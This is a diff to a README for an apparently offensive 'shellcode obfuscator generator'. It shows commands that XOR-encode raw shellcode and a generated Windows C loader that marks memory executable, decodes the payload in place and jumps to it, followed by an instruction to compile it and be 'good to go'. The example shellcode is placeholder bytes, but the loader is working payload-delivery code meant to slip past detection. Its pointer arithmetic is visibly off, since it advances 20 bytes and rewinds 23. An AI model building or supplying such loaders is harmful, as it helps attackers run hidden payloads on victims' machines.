@@ -1,5 +1,55 @@
 # Shellcoding
-Shellcoding Utilities
+Shellcoding Utilities and shellcode obfuscator generator.
+
+
+# Shellcode generator
+
+Choose a key max size int32. Then generate the shellcode using `generator.exe`. The final payload is created using `generator.py`.
+
+```
+> generator.exe 1337 path_to_raw_shellcode_file
+Encoded using the following key: 0x00000539 (1337)
+\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41
+```
+
+Generate the final payload to be compiled.
+
+```
+python3 generator.py 1337 \x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41
+#include <windows.h>
+
+int main() {
+
+    DWORD key = 0x539;
+    DWORD dwSize = 23;
+    DWORD dwProtection = 0;
+    CHAR *shellcode = GlobalAlloc(GPTR, dwSize);
+    VirtualProtect(shellcode, dwSize, PAGE_EXECUTE_READWRITE, &dwProtection);
+
+    strcpy(shellcode, "\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41");
+
+    DWORD *current;
+    int i = 0;
+    for(i; i < dwSize / 4; i++) {
+        current = (DWORD*)shellcode;
+        *current = *current ^ key;
+        shellcode += 4;
+    }
+    shellcode -= dwSize;
+
+    asm ("mov %0, %%eax\n\t"
+         "push %%eax\n\t"
+         "ret"
+         :
+         : "r" (shellcode));
+
+    // We are probably never going to reach that point
+    GlobalFree(shellcode);
+    return 0;
+}
+```
+
+Finally, compile the output file using GCC and you are good to go.
 
 # WARNING
 
